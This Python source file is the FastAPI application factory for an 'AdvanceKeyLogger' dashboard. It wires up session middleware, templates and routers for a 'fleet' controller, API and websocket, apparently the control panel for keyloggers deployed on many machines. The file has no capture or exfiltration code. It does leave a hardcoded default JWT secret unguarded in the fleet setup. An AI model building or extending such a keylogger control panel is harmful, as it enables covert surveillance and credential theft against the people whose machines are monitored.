"""FastAPI application factory for the AdvanceKeyLogger dashboard."""

from __future__ import annotations

import logging
import os
from pathlib import Path

from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware
from contextlib import asynccontextmanager

from config.settings import Settings
from dashboard.auth import auth_router
from dashboard.routes.api import api_router
from dashboard.routes.fleet_api import router as fleet_api_router
from dashboard.routes.fleet_dashboard_api import router as fleet_dashboard_router
from dashboard.routes.fleet_ui import router as fleet_ui_router
from dashboard.routes.pages import pages_router
from dashboard.routes.websocket import ws_router

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).parent
_INSECURE_DEFAULT = "change-me-in-production"


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage application lifespan events."""
    settings = Settings()

    # Initialize fleet controller if enabled
    if settings.get("fleet.enabled"):
        try:
            from storage.fleet_storage import FleetStorage
            from fleet.controller import FleetController
            from fleet.auth import FleetAuth

            db_path = settings.get("fleet.database_path", "./data/fleet.db")
            storage = FleetStorage(db_path)

            # Auth config
            jwt_secret = settings.get("fleet.auth.jwt_secret", "change-me-in-production")
            auth_service = FleetAuth(jwt_secret)

            # Controller config
            controller_config = settings.get("fleet.controller", {})
            controller_config.update(settings.get("fleet.auth", {}))

            controller = FleetController(controller_config, storage)
            await controller.start()

            app.state.fleet_storage = storage
            app.state.fleet_controller = controller
            app.state.fleet_auth = auth_service
            logger.info("Fleet controller started")

        except Exception as e:
            logger.error(f"Failed to start fleet controller: {e}")
            # Don't crash app if fleet fails
            app.state.fleet_controller = None

    yield

    # Shutdown
    if hasattr(app.state, "fleet_controller") and app.state.fleet_controller:
        await app.state.fleet_controller.stop()
        if hasattr(app.state, "fleet_storage"):
            app.state.fleet_storage.close()
        logger.info("Fleet controller stopped")


def create_app(secret_key: str = _INSECURE_DEFAULT) -> FastAPI:
    """Create and configure the FastAPI application."""
    env = os.environ.get("APP_ENV", "development").lower()

    if secret_key == _INSECURE_DEFAULT and env != "development":
        raise RuntimeError(
            "Insecure default secret_key detected in non-development mode. "
            "Set a strong secret_key in config or the APP_ENV=development "
            "environment variable to allow the default."
        )
    if secret_key == _INSECURE_DEFAULT:
        logger.warning(
            "Using insecure default secret_key — do NOT use in production (APP_ENV=%s)",
            env,
        )

    app = FastAPI(
        title="AdvanceKeyLogger Dashboard",
        version="1.0.0",
        docs_url="/api/docs",
        redoc_url=None,
        lifespan=lifespan,
    )

    app.add_middleware(SessionMiddleware, secret_key=secret_key)

    app.mount(
        "/static",
        StaticFiles(directory=str(BASE_DIR / "static")),
        name="static",
    )

    templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))
    app.state.templates = templates

    app.include_router(auth_router)
    app.include_router(pages_router)
    app.include_router(api_router, prefix="/api")
    app.include_router(fleet_api_router, prefix="/api/v1/fleet")
    app.include_router(fleet_dashboard_router, prefix="/api/dashboard/fleet")
    app.include_router(fleet_ui_router)
    app.include_router(ws_router)

    return app
